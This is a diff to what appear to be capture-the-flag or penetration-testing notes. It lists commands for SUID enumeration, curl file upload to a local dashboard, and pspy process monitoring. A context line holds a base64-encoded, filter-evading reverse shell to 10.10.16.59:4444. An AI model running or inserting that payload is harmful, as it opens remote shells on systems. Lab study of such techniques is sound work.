@@ -16,3 +16,16 @@ echo$IFS"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41OS80NDQ0IDA+JjEK"|base64$IFS-d|
 find / -perm -4000 -type f 2>/dev/null  #suid
 
 8. dpkg -l | wc -l
+
+9. curl with cookie -c save cookie -b send cookie
+```
+curl -s -c /tmp/cj -b /tmp/cj -F "action=upload_contract" \
+  -F "contract_file=@/home/walter/test.json;type=application/json" \
+  http://127.0.0.1:5000/dashboard
+
+curl -s -c /tmp/cj -b /tmp/cj -d "action=contract_claim" \
+  http://127.0.0.1:5000/dashboard
+```
+
+10. pspy https://github.com/DominicBreuker/pspy  
+pspy64 -pf -i 1000
